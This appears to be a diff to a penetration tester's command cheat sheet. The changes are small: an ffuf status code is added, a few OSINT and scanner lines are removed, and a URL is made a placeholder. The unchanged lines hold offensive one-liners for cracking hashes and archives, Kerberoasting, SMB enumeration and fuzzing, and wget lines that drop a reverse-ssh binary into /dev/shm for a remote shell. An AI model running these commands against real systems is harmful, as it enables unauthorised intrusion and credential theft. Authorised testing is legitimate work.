@@ -89,7 +89,7 @@ export NAME=
 export TARGET=
 export USER=
 fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt file.zip
-ffuf -c -t 5 -rate 20 -p 0.2 -H "User-Agent: $AGENT" -ac -o $NAME.json -of json -mc 200,302,422 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$DOMAIN/FUZZ
+ffuf -c -t 5 -rate 20 -p 0.2 -H "User-Agent: $AGENT" -ac -o $NAME.json -of json -mc 200,302,422,403 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$DOMAIN/FUZZ
 ffuf -c -t 5 -rate 30 -p 0.2 -H "User-Agent: $AGENT" -r -ac -o $NAME.json -of json -mc 200,302,403 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://$DOMAIN/FUZZ
 ffuf -c -t 5 -rate 30 -p 0.2 -H "User-Agent: $AGENT" -o $NAME_domains.json -of json -H "Host:FUZZ.$DOMAIN" -mc 200,403 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://$DOMAIN/
 ffuf -request REQUESTFILE -request-proto http -w PATH/TO/WORDLIST -fs 0 -c
@@ -115,11 +115,9 @@ hashcat --status --hash-type 18200 --attack-mode 0 ASREProastables.txt `fzf-word
 hashcat --status --hash-type 2100 --attack-mode 0 '$DCC2$10240#user#bb38628253e7681553b72e7da3adf305' `fzf-wordlists`
 hashcat --username --hash-type 0 --attack-mode 0 MD5_hashes.txt `fzf-wordlists`
 hashcat -m 0 hash.txt rockyou.txt
-holehe test@gmail.com
 httpx -probe -list hosts.txt -tech-detect -status-code -fr
 impacket-mssqlclient $DOMAIN/$USER@$IP
 impacket-smbclient $DOMAIN@$IP
-infoga.py -d "$DOMAIN" -s all -b -r "$DOMAIN.txt" -v 2
 ipinfo 1.1.1.1
 john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --fork=10 HashToPwn.txt --rules=all
 john --format=krb5tgs --wordlist=`fzf-wordlists` Kerberoastables.txt
@@ -157,7 +155,6 @@ netdiscover -i INTERFACE_NAME -r IP_RANGE/CIDR -p
 nfc-list
 nfc-scan-device -v
 ngrok authtoken AUTHTOKEN:::https://dashboard.ngrok.com/get-started/your-authtoken
-nikto -host 192.168.10.10
 nmap --script 'smb-enum*' --script-args unsafe=1 -T5 192.168.10.10
 nmap --script broadcast-dhcp-discover
 nmap --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ -p 443 mx.example.com
@@ -285,7 +282,7 @@ tiktok-scraper user USERNAME -d -n 100
 tls-scanner -connect "$TARGET":443
 toutatis.py -s SESSIONID -u starbucks
 turbo -d $DOMAIN -t 5
-waybackurls test.com
+waybackurls $URL
 wget -r --no-parent --reject "index.html*" $ADDRESS
 wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
 wget http://IP:PORT/reverse-ssh
